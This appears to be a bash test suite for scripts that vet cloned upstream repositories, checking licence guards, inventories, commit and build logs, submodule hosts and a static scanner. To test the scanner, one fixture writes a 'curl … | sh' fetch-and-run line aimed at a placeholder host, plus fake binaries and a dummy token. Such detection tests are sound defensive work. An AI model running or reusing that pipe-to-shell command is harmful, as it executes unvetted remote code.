#!/usr/bin/env bash
# Offline tests for workspace scripts. Temp copy of the layout + synthetic fixtures only: no network, no upstream code, no game data.
set -u
ROOT=$(cd "$(dirname "$0")/.." && pwd)
T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
pass=0; fail=0
ok(){ if [ "$1" -eq 0 ]; then echo "ok   - $2"; pass=$((pass+1)); else echo "FAIL - $2"; fail=$((fail+1)); fi; }
fresh(){ rm -rf "$T/w"; mkdir -p "$T/w/upstream" "$T/w/reports"; cp -r "$ROOT/scripts" "$T/w/scripts"; cp "$ROOT/reports/licence-matrix.csv" "$T/w/reports/"; W="$T/w"; }
mkrepo(){ mkdir -p "$1"; git -C "$1" init -q; echo x > "$1/f"; git -C "$1" add -A
  git -C "$1" -c user.email=t@t -c user.name=t commit -qm init; git -C "$1" remote add origin https://example.invalid/r.git; }

echo "# add-upstreams.sh guards"
fresh
out=$(ALLOW_UNVERIFIED=1 bash "$W/scripts/add-upstreams.sh" Percy6Stars 2>&1); echo "$out" | grep -q 'LINK-ONLY'; ok $? "restricted repo refused even with ALLOW_UNVERIFIED=1"
[ ! -e "$W/upstream/Percy6Stars" ]; ok $? "restricted repo not added"
out=$(bash "$W/scripts/add-upstreams.sh" rpf9-extract 2>&1); echo "$out" | grep -q 'UNVERIFIED'; ok $? "unverified repo refused by default"
[ ! -e "$W/upstream/rpf9-extract" ]; ok $? "unverified repo not added"

echo "# gen-inventory.sh"
fresh
n=$(grep -v '^#' "$W/scripts/repos.txt" | grep -c .)
bash "$W/scripts/gen-inventory.sh" > "$T/inv.md"; lines=$(wc -l < "$T/inv.md")
[ "$lines" -eq $((n+2)) ]; ok $? "one table row per manifest repo ($n rows)"
grep -q '^| Percy6Stars .*RESTRICTED-LICENCE | CUSTOM-NONCOMMERCIAL' "$T/inv.md"; ok $? "restricted repo row shows status and licence"
grep -q '| NO | - | - |$' "$T/inv.md"; ok $? "nothing reported as cloned locally"

echo "# static-scan.sh"
fresh; F="$W/upstream/fixture"; mkdir -p "$F"
{ printf '\177ELF'; head -c 2048 /dev/zero; } > "$F/tool"
{ printf 'MZ'; head -c 2048 /dev/zero; } > "$F/stub"
printf 'curl -s http://example.invalid/x | sh\nx=eval(1)\n' > "$F/install.sh"
: > "$F/secrets.pem"
printf 'uses prod.keys\ntoken ghp_%s\n' "$(printf 'a%.0s' $(seq 1 36))" > "$F/notes.txt"
(cd "$W" && bash scripts/static-scan.sh upstream/fixture >/dev/null 2>&1); rc=$?
ok $rc "scan runs with a repo-relative path"
R="$W/reports/scan-fixture.txt"
grep -q 'secrets.pem' "$R"; ok $? "flags key-like file by extension"
grep -q '/tool$' "$R"; ok $? "flags ELF without extension"
grep -q '/stub$' "$R"; ok $? "flags PE/MZ without extension"
grep -q 'ghp_' "$R"; ok $? "flags token-like string"
grep -q 'curl ' "$R"; ok $? "flags curl in script"
grep -q 'prod.keys' "$R"; ok $? "flags console-key keyword"
rm -f "$R"
(cd / && bash "$W/scripts/static-scan.sh" "$F" >"$T/scan.out" 2>"$T/scan.err"); rc=$?
ok $rc "scan exits 0 when run from another working directory"
[ -s "$R" ]; ok $? "report written under the workspace reports/ when run from another directory"
[ ! -e /reports ]; ok $? "no stray /reports directory created"

echo "# static-scan.sh scanning a tree that contains its own output"
fresh; echo ok > "$W/upstream/.keep"
(cd "$W" && bash scripts/static-scan.sh . >/dev/null 2>&1); ok $? "self-scan exits 0"
R=$(ls "$W"/reports/scan-*.txt | head -1)
! grep -q 'input file is also the output' "$R"; ok $? "self-scan report has no grep self-read error"
[ -z "$(awk '/^## secret-looking strings/{f=1;next} /^## /{f=0} f' "$R")" ]; ok $? "self-scan secrets section empty on a clean tree"

echo "# check-licenses.sh"
fresh; mkdir -p "$W/upstream/no_lic" "$W/upstream/has_lic"; echo hi > "$W/upstream/no_lic/a"; echo MIT > "$W/upstream/has_lic/LICENSE"
out=$(bash "$W/scripts/check-licenses.sh" 2>&1)
echo "$out" | grep -q 'no_lic: NO LICENCE FILE'; ok $? "flags repo without licence file"
echo "$out" | grep -q 'has_lic/LICENSE'; ok $? "lists licence file when present"

echo "# record-commits.sh"
fresh; mkrepo "$W/upstream/rc"
bash "$W/scripts/record-commits.sh" >/dev/null 2>&1; ok $? "runs on a synthetic clone"
grep -Eq '^rc	https://example.invalid/r.git	[0-9a-f]{40}	' "$W/reports/upstream-commits.tsv"; ok $? "records remote and full 40-hex SHA"

echo "# record-build.sh"
fresh; mkrepo "$W/upstream/rb"
bash "$W/scripts/record-build.sh" rb -- echo hello >/dev/null 2>&1; rc=$?
[ $rc -eq 0 ]; ok $? "propagates exit code 0"
grep -q 'exit code: 0' "$W/BUILD_LOG.md" && grep -q 'hello' "$W/BUILD_LOG.md"; ok $? "logs command output and exit code 0"
bash "$W/scripts/record-build.sh" rb -- false >/dev/null 2>&1; rc=$?
[ $rc -eq 1 ]; ok $? "propagates failing exit code"
grep -q 'exit code: 1' "$W/BUILD_LOG.md"; ok $? "logs failing exit code"
grep -Eq 'upstream sha: [0-9a-f]{40}' "$W/BUILD_LOG.md"; ok $? "logs upstream SHA"

echo "# submodule-provenance.sh"
fresh; mkrepo "$W/upstream/sm"
printf '[submodule "x"]\n\tpath = x\n\turl = https://example.com/x.git\n[submodule "y"]\n\tpath = y\n\turl = https://github.com/o/y.git\n' > "$W/upstream/sm/.gitmodules"
git -C "$W/upstream/sm" add .gitmodules
git -C "$W/upstream/sm" update-index --add --cacheinfo 160000,1111111111111111111111111111111111111111,x
git -C "$W/upstream/sm" update-index --add --cacheinfo 160000,2222222222222222222222222222222222222222,y
git -C "$W/upstream/sm" -c user.email=t@t -c user.name=t commit -qm sub
bash "$W/scripts/submodule-provenance.sh" >/dev/null 2>&1; R="$W/reports/submodules-sm.txt"
grep -q '^x -> 1111111111111111111111111111111111111111' "$R"; ok $? "lists gitlink x with pinned SHA"
grep -q '^y -> 2222222222222222222222222222222222222222' "$R"; ok $? "lists gitlink y with pinned SHA"
flag=$(awk '/^## submodule URLs not on github.com/{f=1;next} /^## /{f=0} f' "$R")
echo "$flag" | grep -q 'example.com'; ok $? "flags non-github host"
! echo "$flag" | grep -q 'github.com'; ok $? "does not flag github.com host"

echo "# list-vendored.sh"
fresh; V="$W/upstream/vend"; mkdir -p "$V/third_party/lib"; echo 'x' > "$V/Cargo.lock"; echo 'requests' > "$V/requirements.txt"; echo MIT > "$V/third_party/lib/LICENSE"
bash "$W/scripts/list-vendored.sh" >/dev/null 2>&1; R="$W/reports/vendored-vend.txt"
grep -q 'third_party' "$R"; ok $? "finds vendored dir"
grep -q 'Cargo.lock' "$R"; ok $? "finds Cargo.lock"
grep -q 'requirements.txt' "$R"; ok $? "finds requirements.txt"
grep -q 'third_party/lib/LICENSE' "$R"; ok $? "finds nested licence file"

echo "passed=$pass failed=$fail"
[ "$fail" -eq 0 ]
